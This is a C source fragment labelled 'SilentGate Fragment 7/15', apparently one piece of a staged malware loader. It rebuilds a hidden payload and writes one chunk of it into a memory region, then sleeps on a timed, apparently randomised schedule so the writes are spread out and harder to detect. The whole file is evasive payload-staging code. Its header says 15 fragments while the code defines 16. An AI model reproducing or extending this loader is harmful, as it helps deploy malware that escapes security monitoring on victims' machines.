/*
 * SilentGate Fragment 7/15
 * Offset: 53263 bytes  Size: 7609 bytes
 * Schedule: t=673ms (Poisson process)
 * Author: JarDani
 */

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FRAGMENT_ID   7
#define N_FRAGMENTS   16
#define PAYLOAD_SIZE  121746
#define CHUNK_OFFSET  53263
#define CHUNK_SIZE    7609
#define SLEEP_NEXT_MS 673

/* Forward declaration of reconstructor */
extern unsigned char* sg_reconstruct(int* out_len);


/* Fragment 7: Write chunk 7 */
void sg_execute_fragment_7(PVOID mem) {
    if (!mem) return;
    printf("[FRAG 7] Writing chunk at t=673ms\n");

    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);
    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    printf("[FRAG 7] Chunk 7 written at offset %d\n", CHUNK_OFFSET);
    Sleep(SLEEP_NEXT_MS);
}
